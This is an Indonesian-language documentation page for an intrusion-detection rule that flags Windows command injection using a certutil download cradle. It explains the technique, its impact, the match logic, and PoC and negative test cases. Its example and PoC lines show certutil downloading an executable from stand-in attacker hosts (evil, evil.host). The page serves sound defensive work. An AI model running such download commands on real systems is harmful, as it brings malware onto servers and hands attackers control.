# SID 9120005 — Windows command injection: certutil download cradle

**Rule:** `rules/plaintext/cmdi.rules` · **Confidence:** high · **OWASP:** A03 Injection · **Severity:** Critical · **MITRE:** T1105 Ingress Tool Transfer

## Serangan apa ini?
Setelah berhasil command injection di server Windows, penyerang butuh menarik
tool/malware mereka ke dalam. `certutil.exe` adalah utilitas bawaan Windows yang
disalahgunakan sebagai pengunduh ("LOLBin"):
`certutil -urlcache -split -f http://evil/p.exe p.exe` — mengunduh file dari
internet tanpa perlu menginstal apa pun.

## Kalau kena, dampaknya?
Penyerang **menarik malware tahap-2** (beacon C2, ransomware, miner) ke server
dan menjalankannya. Ini fase *Installation / Command-and-Control* — pijakan awal
berubah jadi kontrol penuh dan persisten.

## Apa yang rule ini deteksi?
Kombinasi `certutil` + flag `-urlcache` + sebuah URL `http(s)://` dalam jendela
terbatas di URL request. Lalu lintas normal tidak pernah membawa download-cradle
certutil — jadi deterministik (high confidence, tanpa threshold).

## PoC vs Negative
- `poc.sh` → `certutil.exe -urlcache -split -f http://evil.host/p.exe p.exe` → **harus** memicu SID 9120005.
- `negative.sh` → pertanyaan dokumentasi tentang flag `-urlcache` tanpa URL → kena fast_pattern lalu **ditolak pcre** → TIDAK alert.

## Cara jalanin
```
scripts/rulectl check 9120005
```
Type: single-event.
